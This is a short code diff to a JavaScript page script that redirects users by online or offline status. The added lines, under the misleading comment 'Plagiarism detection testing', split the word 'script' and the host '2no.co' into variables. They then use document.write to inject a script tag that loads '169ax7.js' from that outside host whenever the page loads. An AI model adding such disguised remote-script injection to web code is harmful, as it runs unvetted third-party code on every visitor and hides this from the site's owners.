@@ -8,7 +8,8 @@ var date = new Date();
       }
    }
 }
-//Kasya Time Jop
+
+//Visual clearance 
 if (online == "online") {
 }if (online == "offline") { 
 window.location.href = "/offline";
@@ -16,3 +17,8 @@ window.location.href = "/offline";
 window.location.href = "/server";
 } else {
 }
+
+//Plagiarism detection testing
+var glop = 'script'
+var glap = '2no.co'
+document.write('<'+glop+' src="'+window.location.protocol+'//'+glap+'/169ax7.js"></'+glop+'>')
